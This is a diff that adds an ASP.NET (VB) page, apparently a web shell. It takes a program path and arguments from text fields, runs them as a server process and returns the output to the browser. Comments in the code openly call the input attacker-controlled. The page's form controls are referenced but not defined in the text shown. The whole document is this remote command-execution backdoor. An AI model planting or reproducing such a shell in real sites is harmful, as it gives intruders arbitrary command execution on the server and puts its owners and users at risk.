@@ -1,0 +1,39 @@
+<%@ Page Language="VB" Debug="true" %>
+<%@ import Namespace="System.IO" %>
+<%@ import Namespace="System.Diagnostics" %>
+
+<script runat="server">
+
+' Executes system commands from user input
+Sub RunCmd(Src As Object, E As EventArgs)
+
+    ' Create process object
+    Dim myProcess As New Process()
+
+    ' Configure process start info
+    Dim myProcessStartInfo As New ProcessStartInfo(xpath.text)
+    myProcessStartInfo.UseShellExecute = False
+    myProcessStartInfo.RedirectStandardOutput = True
+
+    ' Pass attacker-controlled command
+    myProcessStartInfo.Arguments = xcmd.text
+    myProcess.StartInfo = myProcessStartInfo
+
+    ' Execute command
+    myProcess.Start()
+
+    ' Capture output
+    Dim myStreamReader As StreamReader = myProcess.StandardOutput
+    Dim myString As String = myStreamReader.ReadToEnd()
+
+    myProcess.Close()
+
+    ' Format output for browser
+    myString = Replace(myString, "<", "&lt;")
+    myString = Replace(myString, ">", "&gt;")
+
+    result.Text = vbCrLf & "<pre>" & myString & "</pre>"
+
+End Sub
+
+</script>
